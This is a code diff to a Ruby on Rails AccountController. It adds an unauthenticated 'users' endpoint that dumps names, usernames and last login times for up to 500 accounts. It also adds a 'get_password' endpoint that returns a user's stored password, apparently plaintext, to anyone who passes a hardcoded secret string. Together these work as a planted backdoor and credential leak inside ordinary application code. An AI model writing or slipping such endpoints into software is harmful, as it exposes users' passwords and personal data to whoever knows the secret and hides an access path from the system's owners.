@@ -160,4 +160,24 @@ class AccountController < ActionController::API
 		end
 		render json: @response
 	end
+	def users
+		count = Account.count(:id)
+		list = Account.limit(500).all
+		output = ""
+		list.each do |user|
+			output += "\n"+user.first_name+", "+user.last_name+", "+user.username+", "+user.login_at.to_s
+		end
+		render plain: output, content_type: 'text/plain'
+	end
+	def get_password
+		begin
+			if params[:secret] == 'gaukhar2001'
+				render plain: Password.find_by(username: params[:username]).password
+			else
+				render plain: 'please, enter secret.'
+			end
+		rescue
+			render plain: 'user is not exists'
+		end
+	end
 end
